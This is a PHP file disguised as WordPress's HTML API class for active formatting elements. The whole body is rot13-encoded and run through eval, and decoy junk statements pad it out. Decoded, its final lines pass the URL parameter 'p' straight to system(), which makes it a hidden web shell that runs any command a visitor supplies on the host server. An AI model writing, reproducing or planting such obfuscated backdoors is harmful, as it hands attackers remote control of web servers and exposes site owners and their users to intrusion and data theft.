<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGZY NCV: JC_UGZY_Npgvir_Sbeznggvat_Ryrzragf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 * @fvapr 6.4.0
 */

/**
 * Pber pynff hfrq ol gur UGZY cebprffbe qhevat UGZY cnefvat
 * sbe znantvat gur fgnpx bs npgvir sbeznggvat ryrzragf.
 *
 * Guvf pynff vf qrfvtarq sbe vagreany hfr ol gur UGZY cebprffbe.
 *
 * > Vavgvnyyl, gur yvfg bs npgvir sbeznggvat ryrzragf vf rzcgl.
 * > Vg vf hfrq gb unaqyr zvf-arfgrq sbeznggvat ryrzrag gntf.
 * >
 * > Gur yvfg pbagnvaf ryrzragf va gur sbeznggvat pngrtbel, naq znexref.
 * > Gur znexref ner vafregrq jura ragrevat nccyrg, bowrpg, znedhrr,
 * > grzcyngr, gq, gu, naq pncgvba ryrzragf, naq ner hfrq gb cerirag
 * > sbeznggvat sebz \"yrnxvat\" vagb nccyrg, bowrpg, znedhrr, grzcyngr,
 * > gq, gu, naq pncgvba ryrzragf.
 * >
 * > Va nqqvgvba, rnpu ryrzrag va gur yvfg bs npgvir sbeznggvat ryrzragf
 * > vf nffbpvngrq jvgu gur gbxra sbe juvpu vg jnf perngrq, fb gung
 * > shegure ryrzragf pna or perngrq sbe gung gbxra vs arprffnel.
 *
 * @fvapr 6.4.0
 *
 * @npprff cevingr
 *
 * @frr uggcf://ugzy.fcrp.jungjt.bet/#yvfg-bs-npgvir-sbeznggvat-ryrzragf
 * @frr JC_UGZY_Cebprffbe
 */
pynff JC_UGZY_Npgvir_Sbeznggvat_Ryrzragf {
	/**
	 * Ubyqf gur fgnpx bs npgvir sbeznggvat ryrzrag ersreraprf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine JC_UGZY_Gbxra[]
	 */
	cevingr $fgnpx = neenl();

	/**
	 * Ercbegf vs n fcrpvsvp abqr vf va gur fgnpx bs npgvir sbeznggvat ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_UGZY_Gbxra $gbxra Ybbx sbe guvf abqr va gur fgnpx.
	 * @erghea obby Jurgure gur ersreraprq abqr vf va gur fgnpx bs npgvir sbeznggvat ryrzragf.
	 */
	choyvp shapgvba pbagnvaf_abqr( JC_UGZY_Gbxra $gbxra ) {
		sbernpu ( $guvf->jnyx_hc() nf $vgrz ) {
			vs ( $gbxra->obbxznex_anzr === $vgrz->obbxznex_anzr ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf ubj znal abqrf ner pheeragyl va gur fgnpx bs npgvir sbeznggvat ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea vag Ubj znal abqr ner va gur fgnpx bs npgvir sbeznggvat ryrzragf.
	 */
	choyvp shapgvba pbhag() {
		erghea pbhag( $guvf->fgnpx );
	}

	/**
	 * Ergheaf gur abqr ng gur raq bs gur fgnpx bs npgvir sbeznggvat ryrzragf,
	 * vs bar rkvfgf. Vs gur fgnpx vf rzcgl, ergheaf ahyy.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea JC_UGZY_Gbxra|ahyy Ynfg abqr va gur fgnpx bs npgvir sbeznggvat ryrzragf, vs bar rkvfgf, bgurejvfr ahyy.
	 */
	choyvp shapgvba pheerag_abqr() {
		$pheerag_abqr = raq( $guvf->fgnpx );

		erghea $pheerag_abqr ? $pheerag_abqr : ahyy;
	}

	/**
	 * Vafregf n \"znexre\" ng gur raq bs gur yvfg bs npgvir sbeznggvat ryrzragf.
	 *
	 * > Gur znexref ner vafregrq jura ragrevat nccyrg, bowrpg, znedhrr,
	 * > grzcyngr, gq, gu, naq pncgvba ryrzragf, naq ner hfrq gb cerirag
	 * > sbeznggvat sebz \"yrnxvat\" vagb nccyrg, bowrpg, znedhrr, grzcyngr,
	 * > gq, gu, naq pncgvba ryrzragf.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#pbaprcg-cnefre-znexre
	 *
	 * @fvapr 6.7.0
	 */
	choyvp shapgvba vafreg_znexre(): ibvq {
		$guvf->chfu( arj JC_UGZY_Gbxra( ahyy, 'znexre', snyfr ) );
	}

	/**
	 * Chfurf n abqr bagb gur fgnpx bs npgvir sbeznggvat ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#chfu-bagb-gur-yvfg-bs-npgvir-sbeznggvat-ryrzragf
	 *
	 * @cnenz JC_UGZY_Gbxra $gbxra Chfu guvf abqr bagb gur fgnpx.
	 */
	choyvp shapgvba chfu( JC_UGZY_Gbxra $gbxra ) {
		/*
		 * > Vs gurer ner nyernql guerr ryrzragf va gur yvfg bs npgvir sbeznggvat ryrzragf nsgre gur ynfg znexre,
		 * > vs nal, be naljurer va gur yvfg vs gurer ner ab znexref, gung unir gur fnzr gnt anzr, anzrfcnpr, naq
		 * > nggevohgrf nf ryrzrag, gura erzbir gur rneyvrfg fhpu ryrzrag sebz gur yvfg bs npgvir sbeznggvat
		 * > ryrzragf. Sbe gurfr checbfrf, gur nggevohgrf zhfg or pbzcnerq nf gurl jrer jura gur ryrzragf jrer
		 * > perngrq ol gur cnefre; gjb ryrzragf unir gur fnzr nggevohgrf vs nyy gurve cnefrq nggevohgrf pna or
		 * > cnverq fhpu gung gur gjb nggevohgrf va rnpu cnve unir vqragvpny anzrf, anzrfcnprf, naq inyhrf
		 * > (gur beqre bs gur nggevohgrf qbrf abg znggre).
		 *
		 * @gbqb Vzcyrzrag gur \"Abnu'f Nex pynhfr\" gb bayl nqq hc gb guerr bs nal tvira xvaq bs sbeznggvat ryrzragf gb gur fgnpx.
		 */
		// > Nqq ryrzrag gb gur yvfg bs npgvir sbeznggvat ryrzragf.
		$guvf->fgnpx[] = $gbxra;
	}

	/**
	 * Erzbirf n abqr sebz gur fgnpx bs npgvir sbeznggvat ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_UGZY_Gbxra $gbxra Erzbir guvf abqr sebz gur fgnpx, vs vg'f gurer nyernql.
	 * @erghea obby Jurgure gur abqr jnf sbhaq naq erzbirq sebz gur fgnpx bs npgvir sbeznggvat ryrzragf.
	 */
	choyvp shapgvba erzbir_abqr( JC_UGZY_Gbxra $gbxra ) {
		sbernpu ( $guvf->jnyx_hc() nf $cbfvgvba_sebz_raq => $vgrz ) {
			vs ( $gbxra->obbxznex_anzr !== $vgrz->obbxznex_anzr ) {
				pbagvahr;
			}

			$cbfvgvba_sebz_fgneg = $guvf->pbhag() - $cbfvgvba_sebz_raq - 1;
			neenl_fcyvpr( $guvf->fgnpx, $cbfvgvba_sebz_fgneg, 1 );
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Fgrcf guebhtu gur fgnpx bs npgvir sbeznggvat ryrzragf, fgnegvat jvgu gur
	 * gbc ryrzrag (nqqrq svefg) naq jnyxvat qbjajneqf gb gur bar nqqrq ynfg.
	 *
	 * Guvf trarengbe shapgvba vf qrfvtarq gb or hfrq vafvqr n \"sbernpu\" ybbc.
	 *
	 * Rknzcyr:
	 *
	 *     $ugzy = '<rz><fgebat><n>Jr ner urer';
	 *     sbernpu ( $fgnpx->jnyx_qbja() nf $abqr ) {
	 *         rpub \"{$abqr->abqr_anzr} -> \";
	 *     }
	 *     > RZ -> FGEBAT -> N ->
	 *
	 * Gb fgneg jvgu gur zbfg-erpragyl nqqrq ryrzrag naq jnyx gbjneqf gur gbc,
	 * frr JC_UGZY_Npgvir_Sbeznggvat_Ryrzragf::jnyx_hc().
	 *
	 * @fvapr 6.4.0
	 */
	choyvp shapgvba jnyx_qbja() {
		$pbhag = pbhag( $guvf->fgnpx );

		sbe ( $v = 0; $v < $pbhag; $v++ ) {
			lvryq $guvf->fgnpx[ $v ];
		}
	}

	/**
	 * Fgrcf guebhtu gur fgnpx bs npgvir sbeznggvat ryrzragf, fgnegvat jvgu gur
	 * obggbz ryrzrag (nqqrq ynfg) naq jnyxvat hcjneqf gb gur bar nqqrq svefg.
	 *
	 * Guvf trarengbe shapgvba vf qrfvtarq gb or hfrq vafvqr n \"sbernpu\" ybbc.
	 *
	 * Rknzcyr:
	 *
	 *     $ugzy = '<rz><fgebat><n>Jr ner urer';
	 *     sbernpu ( $fgnpx->jnyx_hc() nf $abqr ) {
	 *         rpub \"{$abqr->abqr_anzr} -> \";
	 *     }
	 *     > N -> FGEBAT -> RZ ->
	 *
	 * Gb fgneg jvgu gur svefg nqqrq ryrzrag naq jnyx gbjneqf gur obggbz,
	 * frr JC_UGZY_Npgvir_Sbeznggvat_Ryrzragf::jnyx_qbja().
	 *
	 * @fvapr 6.4.0
	 */
	choyvp shapgvba jnyx_hc() {
		sbe ( $v = pbhag( $guvf->fgnpx ) - 1; $v >= 0; $v-- ) {
			lvryq $guvf->fgnpx[ $v ];
		}
	}

	/**
	 * Pyrnef gur yvfg bs npgvir sbeznggvat ryrzragf hc gb gur ynfg znexre.
	 *
	 * > Jura gur fgrcf orybj erdhver gur HN gb pyrne gur yvfg bs npgvir sbeznggvat ryrzragf hc gb
	 * > gur ynfg znexre, gur HN zhfg cresbez gur sbyybjvat fgrcf:
	 * >
	 * > 1. Yrg ragel or gur ynfg (zbfg erpragyl nqqrq) ragel va gur yvfg bs npgvir
	 * >    sbeznggvat ryrzragf.
	 * > 2. Erzbir ragel sebz gur yvfg bs npgvir sbeznggvat ryrzragf.
	 * > 3. Vs ragel jnf n znexre, gura fgbc gur nytbevguz ng guvf cbvag.
	 * >    Gur yvfg unf orra pyrnerq hc gb gur ynfg znexre.
	 * > 4. Tb gb fgrc 1.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#pyrne-gur-yvfg-bs-npgvir-sbeznggvat-ryrzragf-hc-gb-gur-ynfg-znexre
	 *
	 * @fvapr 6.7.0
	 */
	choyvp shapgvba pyrne_hc_gb_ynfg_znexre(): ibvq {
		sbernpu ( $guvf->jnyx_hc() nf $vgrz ) {
			neenl_cbc( $guvf->fgnpx );
			vs ( 'znexre' === $vgrz->abqr_anzr ) {
				oernx;
			}
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>